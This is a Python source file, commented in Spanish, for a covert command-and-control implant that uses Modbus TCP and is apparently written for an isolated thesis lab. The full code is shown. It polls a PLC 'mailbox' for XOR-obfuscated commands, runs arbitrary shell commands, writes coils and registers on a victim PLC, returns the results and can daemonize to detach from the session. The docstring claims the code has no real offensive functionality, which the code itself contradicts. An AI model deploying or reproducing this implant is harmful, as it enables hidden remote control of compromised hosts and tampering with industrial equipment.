#!/usr/bin/env python3
"""
Implante C2 encubierto sobre Modbus TCP — componente víctima.

Script AUTOCONTENIDO que se despliega en la máquina comprometida
(srv_empresa, nodered_scada, o cualquier host con Python3 + pymodbus).
NO depende del framework de ataques del toolkit — usa pymodbus
directamente para ser portable.

Hace polling periódico del PLC-buzón (holding registers zona CMD).
Cuando detecta un comando nuevo (magic=0xC2C2 + seq nuevo):
  - opcode 0x01 (shell): ejecuta el payload como comando de sistema.
  - opcode 0x02 (write_coil): escritura Modbus FC=5 contra el PLC víctima.
  - opcode 0x03 (write_register): escritura Modbus FC=6 contra el PLC víctima.
  - opcode 0xFF (exit): se detiene.

Publica la respuesta en la zona RSP del PLC-buzón.

USO:
    python3 c2_modbus_implant.py --mailbox 192.168.10.11 --port 502 --poll 3

SOLO para el laboratorio aislado del TFM. No contiene funcionalidad
ofensiva real — es una prueba de concepto educativa.
"""

import argparse
import os
import struct
import subprocess
import sys
import time

try:
    from pymodbus.client import ModbusTcpClient
    import pymodbus
    _PMB_VER = tuple(int(x) for x in pymodbus.__version__.split(".")[:2])
except ImportError:
    print("[!] pymodbus no instalado. Ejecuta: pip3 install pymodbus",
          file=sys.stderr)
    sys.exit(1)

# pymodbus >=3.7 usa device_id=; <3.7 usa slave=
_UID_KEY = "device_id" if _PMB_VER >= (3, 7) else "slave"


# ---------------------------------------------------------------------------
# Constantes del protocolo (deben coincidir con c2_modbus.py / config.py)
# ---------------------------------------------------------------------------
CMD_BASE = 1000
RSP_BASE = 1200

MAGIC_CMD = 0xC2C2
MAGIC_RSP = 0xD1D1

OP_SHELL       = 0x01
OP_WRITE_COIL  = 0x02
OP_WRITE_REG   = 0x03
OP_EXIT        = 0xFF

CMD_HEADER_LEN  = 6    # magic, seq, opcode, param1, param2, payload_len
RSP_HEADER_LEN  = 4    # magic, seq_echo, status, payload_len
RSP_PAYLOAD_MAX = 121  # registros de payload respuesta


# ---------------------------------------------------------------------------
# Codificación / decodificación (copia autocontenida)
# ---------------------------------------------------------------------------

def _xor_bytes(data, key):
    if not key:
        return data
    out = bytearray(len(data))
    klen = len(key)
    for i, b in enumerate(data):
        out[i] = b ^ key[i % klen]
    return bytes(out)


def decode_payload(registers, byte_length, xor_key_bytes):
    raw = b""
    for r in registers:
        raw += struct.pack(">H", r)
    raw = raw[:byte_length]
    raw = _xor_bytes(raw, xor_key_bytes)
    return raw.decode("utf-8", errors="replace")


def encode_payload(text, xor_key_bytes):
    raw = text.encode("utf-8", errors="replace")
    max_bytes = RSP_PAYLOAD_MAX * 2
    if len(raw) > max_bytes:
        raw = raw[:max_bytes]
    raw = _xor_bytes(raw, xor_key_bytes)
    byte_len = len(raw)
    if len(raw) % 2:
        raw += b"\x00"
    regs = []
    for i in range(0, len(raw), 2):
        regs.append(struct.unpack(">H", raw[i:i+2])[0])
    return regs, byte_len


# ---------------------------------------------------------------------------
# Compatibilidad pymodbus: distintas versiones usan slave=, unit= o ninguno.
# ---------------------------------------------------------------------------

def _uid_kw(uid):
    return {_UID_KEY: uid}


def _mb_write_registers(client, address, values, uid=1):
    return client.write_registers(address, values, **_uid_kw(uid))


def _mb_read_holding(client, address, count, uid=1):
    return client.read_holding_registers(address, count=count, **_uid_kw(uid))


def _mb_write_coil(client, address, value, uid=1):
    return client.write_coil(address, value, **_uid_kw(uid))


def _mb_write_register(client, address, value, uid=1):
    return client.write_register(address, value, **_uid_kw(uid))


# ---------------------------------------------------------------------------
# Ejecución de opcodes
# ---------------------------------------------------------------------------

def exec_shell(payload_text):
    """Ejecuta un comando de sistema y devuelve (status, output_text)."""
    try:
        result = subprocess.run(
            payload_text, shell=True,
            capture_output=True, text=True,
            timeout=60, encoding="utf-8", errors="replace")
        output = result.stdout
        if result.stderr:
            output += result.stderr
        status = 0 if result.returncode == 0 else 1
        return status, output.strip()
    except subprocess.TimeoutExpired:
        return 1, "[timeout: comando excedió 60s]"
    except Exception as e:
        return 1, f"[error: {e}]"


def exec_write_coil(target_ip, target_port, data_address, value):
    """Ejecuta Modbus WRITE_COIL (FC=5) contra el PLC víctima."""
    try:
        client = ModbusTcpClient(target_ip, port=target_port, timeout=10)
        if not client.connect():
            return 1, f"No se pudo conectar a {target_ip}:{target_port}"
        result = _mb_write_coil(client, data_address, bool(value))
        client.close()
        if result.isError():
            return 1, f"Error Modbus: {result}"
        return 0, f"WRITE_COIL OK: {target_ip}:{target_port} addr={data_address} val={value}"
    except Exception as e:
        return 1, f"Excepción: {e}"


def exec_write_register(target_ip, target_port, data_address, value):
    """Ejecuta Modbus WRITE_REGISTER (FC=6) contra el PLC víctima."""
    try:
        client = ModbusTcpClient(target_ip, port=target_port, timeout=10)
        if not client.connect():
            return 1, f"No se pudo conectar a {target_ip}:{target_port}"
        result = _mb_write_register(client, data_address, value)
        client.close()
        if result.isError():
            return 1, f"Error Modbus: {result}"
        return 0, f"WRITE_REGISTER OK: {target_ip}:{target_port} addr={data_address} val={value}"
    except Exception as e:
        return 1, f"Excepción: {e}"


# ---------------------------------------------------------------------------
# Bucle principal del implante
# ---------------------------------------------------------------------------

def implant_loop(mailbox_ip, mailbox_port, poll_interval, xor_key_bytes,
                  mailbox_uid=2):
    """Bucle infinito de polling + ejecución + respuesta."""
    last_seq = -1
    log(f"[*] Implante C2 Modbus iniciado")
    log(f"    PLC-buzón  : {mailbox_ip}:{mailbox_port} (UID={mailbox_uid})")
    log(f"    Polling    : cada {poll_interval}s")
    log(f"    XOR        : {'activo' if xor_key_bytes else 'desactivado'}")
    log(f"    CMD regs   : {CMD_BASE}-{CMD_BASE + CMD_HEADER_LEN + 100}")
    log(f"    RSP regs   : {RSP_BASE}-{RSP_BASE + RSP_HEADER_LEN + RSP_PAYLOAD_MAX}")

    while True:
        try:
            client = ModbusTcpClient(mailbox_ip, port=mailbox_port, timeout=10)
            if not client.connect():
                log(f"[-] No se pudo conectar al PLC-buzón. Reintentando...")
                time.sleep(poll_interval * 2)
                continue

            rr = _mb_read_holding(client, CMD_BASE, CMD_HEADER_LEN,
                                  uid=mailbox_uid)
            if rr.isError():
                client.close()
                time.sleep(poll_interval)
                continue

            magic = rr.registers[0]
            seq = rr.registers[1]
            opcode = rr.registers[2]
            param1 = rr.registers[3]
            param2 = rr.registers[4]
            payload_len = rr.registers[5]

            if magic != MAGIC_CMD or seq == last_seq:
                client.close()
                time.sleep(poll_interval)
                continue

            log(f"[+] Comando recibido: seq={seq}, opcode=0x{opcode:02X}, "
                f"p1={param1}, p2={param2}, payload={payload_len}B")

            payload_text = ""
            if payload_len > 0:
                n_regs = (payload_len + 1) // 2
                n_regs = min(n_regs, 100)
                pr = _mb_read_holding(client,
                    CMD_BASE + CMD_HEADER_LEN, n_regs, uid=mailbox_uid)
                if not pr.isError():
                    payload_text = decode_payload(
                        pr.registers, payload_len, xor_key_bytes)

            status, response = 1, "opcode desconocido"

            if opcode == OP_SHELL:
                log(f"[*] Ejecutando shell: {payload_text!r}")
                status, response = exec_shell(payload_text)

            elif opcode == OP_WRITE_COIL:
                target_ip = payload_text.strip() if payload_text else mailbox_ip
                log(f"[*] WRITE_COIL -> {target_ip} addr={param1} val={param2}")
                status, response = exec_write_coil(
                    target_ip, 502, param1, param2)

            elif opcode == OP_WRITE_REG:
                target_ip = payload_text.strip() if payload_text else mailbox_ip
                log(f"[*] WRITE_REGISTER -> {target_ip} addr={param1} val={param2}")
                status, response = exec_write_register(
                    target_ip, 502, param1, param2)

            elif opcode == OP_EXIT:
                log("[*] Recibido EXIT. Publicando ACK y terminando.")
                rsp_regs, rsp_bytes = encode_payload(
                    "implante terminado", xor_key_bytes)
                rsp_header = [0x0000, seq, 0, rsp_bytes]
                _mb_write_registers(client,
                    RSP_BASE + 1, rsp_header[1:] + rsp_regs, uid=mailbox_uid)
                _mb_write_registers(client, RSP_BASE, [MAGIC_RSP],
                                    uid=mailbox_uid)
                client.close()
                last_seq = seq
                log("[*] Implante C2 finalizado.")
                return

            log(f"[+] Resultado: status={'OK' if status == 0 else 'ERR'}, "
                f"respuesta={len(response)} chars")

            rsp_regs, rsp_bytes = encode_payload(response, xor_key_bytes)
            rsp_header = [0x0000, seq, status, rsp_bytes]
            body = rsp_header[1:] + rsp_regs
            _mb_write_registers(client, RSP_BASE + 1, body, uid=mailbox_uid)
            _mb_write_registers(client, RSP_BASE, [MAGIC_RSP], uid=mailbox_uid)

            last_seq = seq
            client.close()

        except KeyboardInterrupt:
            log("[*] Interrumpido por el usuario.")
            return
        except Exception as e:
            log(f"[!] Error en el bucle: {e}")
            time.sleep(poll_interval * 2)
            continue

        time.sleep(poll_interval)


def log(msg):
    """Log mínimo a stderr (no interfiere con stdout si se redirige)."""
    print(msg, file=sys.stderr, flush=True)


def _daemonize(log_path):
    """POSIX double-fork: desacopla del terminal y sesión SSH."""
    sys.stdout.flush()
    sys.stderr.flush()
    if os.fork() > 0:
        os._exit(0)
    os.setsid()
    if os.fork() > 0:
        os._exit(0)
    devnull = os.open(os.devnull, os.O_RDWR)
    os.dup2(devnull, 0)
    log_fd = os.open(log_path, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o644)
    os.dup2(log_fd, 1)
    os.dup2(log_fd, 2)
    if devnull > 2:
        os.close(devnull)
    if log_fd > 2:
        os.close(log_fd)


# ---------------------------------------------------------------------------
# Entrypoint
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Implante C2 sobre Modbus TCP (TFM — laboratorio aislado)")
    parser.add_argument("--mailbox", required=True,
                        help="IP del PLC-buzón (ej: 192.168.10.11)")
    parser.add_argument("--port", type=int, default=502,
                        help="Puerto Modbus del PLC-buzón")
    parser.add_argument("--poll", type=float, default=3.0,
                        help="Intervalo de polling en segundos")
    parser.add_argument("--uid", type=int, default=2,
                        help="Unit ID del PLC-buzón (debe coincidir con su ACL)")
    parser.add_argument("--xor-key", default=None,
                        help="Clave XOR precompartida (string)")
    parser.add_argument("--daemon", action="store_true",
                        help="Ejecutar como daemon (double-fork, log a fichero)")
    parser.add_argument("--log-file", default="/tmp/c2_implant.log",
                        help="Fichero de log en modo daemon")
    args = parser.parse_args()

    if args.daemon:
        _daemonize(args.log_file)

    xor_key_bytes = args.xor_key.encode("utf-8") if args.xor_key else None

    implant_loop(args.mailbox, args.port, args.poll, xor_key_bytes,
                 mailbox_uid=args.uid)


if __name__ == "__main__":
    main()
